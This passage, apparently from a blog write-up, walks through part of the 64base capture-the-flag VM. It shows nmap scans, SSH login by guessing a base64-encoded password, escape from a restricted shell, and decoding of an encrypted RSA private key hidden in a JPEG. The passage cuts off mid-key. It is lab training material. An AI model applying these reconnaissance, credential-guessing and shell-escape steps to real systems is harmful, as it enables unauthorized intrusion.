&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOjY0YmFzZTVoMzc3Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
64base:64base5h377&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Fifth flag&lt;/h2&gt;

&lt;p&gt;After all that, I think we can try to work on the SSH ports. Firstly, I'll run another Nmap scan, checking all possible ports, to check, whether or not we are missing anything. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -Pn -A -p- 192.168.56.102

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-02-11 13:48 EST

PORT      STATE SERVICE VERSION
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-robots.txt: 429 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| /administrator/ /admin/ /login/ /88888/ /88888888/
| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
|_/across/ /activation/ /Adjustments/
|_http-server-header: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 64base
4899/tcp  open  radmin?
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wow, we have another SSH, at port &lt;b&gt;62964&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -nv 192.168.56.102 22
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ssh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001

&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmmm, these credentials seem a little bit odd. Let's try the second one, where as login:password pair we can use decrypted content of previous flag - 64base:64base5h377. Unfortunately, these don't seem to work. &lt;/p&gt;

&lt;p&gt;After a while, I came with idea of encrypting the password using base64, and feeling to do this was right! This credentials have worked. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;64base5h377 | base64
NjRiYXNlNWgzNzcK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Than let's log in. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh 64base@192.168.56.102 -p 62964
64base@192.168.56.102&lt;span class=&quot;s1&quot;&gt;'s password:

Last login: Sat Feb 11 18:25:53 2017 from 192.168.56.101
64base@64base:~$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we're in. But what now? None of the commands seems to work. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;ls -la
well_done_:D
&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;cat well_done_:D
 _           
 &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;                                                       
  &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;_          _.-._                
   X:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
   &lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          
    &lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\=&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /          
   /X:::&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  .-./&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'\.--.       
   \\/\::\ / /     (    l      
    ~\ \::\ /      `.   L.      
      \/:::|         `.'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;     
      /:/&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;|         &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;    &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;.    
      &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'`.          &amp;gt;    )     
             \       //  .-'&lt;/span&gt;     
              |     /&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  .&lt;span class=&quot;s1&quot;&gt;'        
              `-..-'&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;       
              __||/  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'          
             / _ \ #  |            
            |  #  |#  |           
         LS |  #  |#             

    BioTronics Security Droid
64base@64base:~$ uname -a
-rbash: uname: command not found&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After spending lot of time, trying different combinations of commands, I've decided to look in the &lt;b&gt;env&lt;/b&gt; variables. Custom &lt;b&gt;$PATH&lt;/b&gt;? Let's take a look at it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;env
&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/rbash
&lt;span class=&quot;nv&quot;&gt;SSH_CLIENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.101 45436 62964
&lt;span class=&quot;nv&quot;&gt;SSH_TTY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/pts/0
&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64base
&lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/64base
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/alt-bin
&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/64base
&lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB.UTF-8
&lt;span class=&quot;nv&quot;&gt;GCC_COLORS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;31:warning&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;35:note&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;36:caret&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;32:locus&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01:quote&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01
&lt;span class=&quot;nv&quot;&gt;SHLVL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/64base
&lt;span class=&quot;nv&quot;&gt;LANGUAGE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB:en
&lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64base
&lt;span class=&quot;nv&quot;&gt;SSH_CONNECTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.101 45436 192.168.56.102 62964
&lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/alt-bin/env
&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
/var/alt-bin/awk /var/alt-bin/base64 /var/alt-bin/cat /var/alt-bin/dircolors /var/alt-bin/droids /var/alt-bin/egrep /var/alt-bin/env /var/alt-bin/fgrep /var/alt-bin/file /var/alt-bin/find /var/alt-bin/grep /var/alt-bin/head /var/alt-bin/less /var/alt-bin/ls /var/alt-bin/more /var/alt-bin/perl /var/alt-bin/python /var/alt-bin/ruby /var/alt-bin/tail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have the list of all executables that we have access to. But wait can You see it too? What are droids? Let's check that out! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/matrix.png&quot; alt=&quot;Droids-executable&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wow, cool effect. But it seems to go in an infinite loop. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/droids.png&quot; alt=&quot;Droids-after&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After closing down, it showed this message. But is that it? Some cryptic clues? Luckily no, somehow we are now able to execute previously restricted commands. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;uname -a
Linux 64base 3.16.0-4-586 &lt;span class=&quot;c&quot;&gt;#1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can now find next flag! After some more searching I've found it in &lt;b&gt;/var/www/html/admin/S3cR37&lt;/b&gt; directory.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www
&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;admin
&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin$ &lt;/span&gt;ls -la
index.php  S3cR37
&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;S3cR37/
&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;ls -la
flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's decode it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
Look Inside! :D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Sixth flag&lt;/h2&gt;

&lt;p&gt;Let's check this file using &lt;b&gt;file&lt;/b&gt; command. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;file flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;
flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 72x72, segment length 16, comment: &lt;span class=&quot;s2&quot;&gt;&quot;4c5330744c5331435255644a546942535530456755464a4a566b4655525342&quot;&lt;/span&gt;, baseline, precision 8, 960x720, frames 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;JPEG image? We can copy it to Kali using &lt;b&gt;scp&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;scp -P 62964 64base@192.168.56.102:/var/www/html/admin/S3cR37/flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt; flag5.jpeg
64base@192.168.56.102&lt;span class=&quot;s1&quot;&gt;'s password:
flag5{TG9vayBJbnNpZGUhIDpECg==}               100%  192KB 192.0KB/s   00:00&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/usetheforce.png&quot; alt=&quot;Use-the-force-Luke&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay, after all these puzzles, I think &quot;&lt;b&gt;Use the force&lt;/b&gt;&quot; will be somehow essential in finding the next flag. But firstly, let's check this file for some more clues. After using &lt;b&gt;string&lt;/b&gt; command, we can actually see some big chunk of data, looking like hexadecimal string. Let's decode it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;strings flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;
JFIF
4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a
-- Other data omitted --

&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -- Enter this huge chunk of data --  | xxd -r -p
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBBRVMtMTI4LUNCQyw2MjFBMzhBQUQ0RTlGQUEzNjU3Q0EzODg4RDlCMzU2QwoKbUR0
UnhJd2g0MFJTTkFzMitsTlJIdlM5eWhNK2VheHhVNXlyR1BDa3JiUVcvUmdQUCtSR0pCejlWclRr
dll3NgpZY091WWVaTWpzNGZJUG43Rlp5Smd4R0hoU3hRb3hWbjlrRGt3bnNNTkRpcnRjb0NPazlS
REFHNWV4OXg0VE16CjhJbERCUXE1aTlZemo5dlBmemVCRFpkSXo5RHcyZ24yU2FFZ3U1emVsKzZI
R09iRjhaaDNNSWNoeThzMVhyRTAKa3ZMS0kyNTJteld3NGtiU3M5K1FhV3loMzRrOEpJVnp1YzFR
Q3liejVXb1U1WTU2RzZxMVJkczBiY1ZxTFVzZQpNU3pLazNtS2FXQXlMWGxvN0xubXFxVUZLSG5k
QkUxU2hQVlZpNGIwR3lGSUxPT3Z0bXZGYjQremh1NmpPV1lICmsyaGRDSE5TdCtpZ2d5OWhoM2ph
RWdVblNQWnVFN05Kd0RZYTdlU0RhZ0wxN1hLcGttMllpQlZyVVh4Vk1ub2IKd1hSZjVCY0dLVTk3
eGRvclYyVHEraDlLU2xaZTc5OXRyVHJGR05lMDV2eERyaWo1VXQyS2NReCs5OEs4S3BXTApndUpQ
UlBLR2lqbzk2SERHYzNMNVlzeE9iVmcrL2ZqMEF2c0tmcmNWL2x4YVcrSW15bWMxTVhpSk1ibUN6
bER3ClRBV21hcWtSRkR5QTFIVXZ0dlNlVnFTMS9IamhEdzlkNEtzdnNqa2p2eWVRVHNzZnNkR2NV
MGhEa1h3Uldzc2QKMmQzRytOam0xUjVaTE5nUmxOcFZHamhLQzRBc2ZYUzNKMHoydDNCUE05Wk9C
TUJlOUR4OHptNXhGWTl6V3RydgpBR3ByMEJoOEtRd21walFVYzFhZnNxYVFYMFVITkxYVDFaT1dL
amc0U0EzWEM5ZENFeUZxMFNJeFFqTzlMR0NHCjRRNW5jZlVobXZ0cXl1dENsbDJkWFBzWFZEZTRl
b0QxQ2t2Sk5EWTNLUFcrR2tOOUwrOUNQeTgrRE51bkZJd3gKK1QrKzdRZy91UFhLcTRNNjFJUTgw
MzRVaHVSV1M0VHFQOWF6WDNDRzlMeW9pQjZWYktPZUR3TjhhaWxMS1pCcwpmWTlRNkFNMXN5bGl6
SDFubnhLT3RaUVd1cnhqR0pCSXM2MnRlbE1rYXM5eU5NazNMdTdxUkg2c3dPOXNkVEJpCitqMHg0
dURaakpjZ01YeGZiMHc1QTY0bFlGc01SekZqN1hkZnkxOStNZThKRWhROEtOWER3UUtEeVVMRk9U
c3oKMTNWZkJOeFlzeUw1ekdYTnp5cVo0SS9PTzdNZWQyajBHejBnMjFpSEEvMDZtcnMyY2xkczZT
VUJHRXZuOE5pVgpyU3JINnZFczRTemcweDhkZEd2UTBxVzF2TWtUUnUzT3kvZTEwRjc0NXhETUFU
S1JsS1o2cllITUN4SjNJY250CkV6ME9NWFlkQzZDaUYvSVd0Z2RVK2hLeXZzNHNGdENCY2xTYWdt
RFRKMmtaZHU0UlJ3WVZWNm9JTno5YnBPdkUKUngzSFVxZm5LU2hydXpNOVpraUlrdVNmUnRmaU12
YlR6ZmZKVFM0YzQ4Q081WC9SZUYvQWFNeGtiU2RFT0ZzSQpGdjlYZGk5U2ROdXhHSEUyRzRIdkpk
SXByRlVyVlNwU0k4MHdncmIyNDVzdzZnVG9pdFo5MGhKNG5KNWF5N0FHCllpYWE1bzc4NzcvZnc2
WVovMlUzQURkaVNPQm0raGpWMkpWeHJveVVYYkc1ZGZsM204R3ZmNzFKNjJGSHE4dmoKcUphblNr
ODE3NXowYmpyWFdkTEczRFNsSUppc2xQVyt5RGFmN1lCVll3V1IrVEExa0M2aWVJQTV0VTNwbi9J
Mwo2NFo1bXBDK3dxZlR4R2dlQ3NnSWs5dlNuMnAvZWV0ZEkzZlFXOFdYRVJiRGV0MVVMSFBxdElp
N1NaYmo4ditQCmZuSExRdkV3SXMrQmYxQ3BLMUFrWmVVTVJFUWtCaERpNzJIRmJ3MkcvenF0aS9Z
ZG5xeEF5bDZMWnpJZVFuOHQKL0dqNGthckoxaU05SWYzOWRNNU9hQ1ZaUi9UT0JWYVI4bXJQN1Z0
&lt;span class=&quot;nv&quot;&gt;Sm9yOWplSDJ0RUwwdG9FcVdCMVBLMHVYUAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This looks like another base64 decryption. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -- Enter this huge chunk of base64 data --  | base64 -d
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C

mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
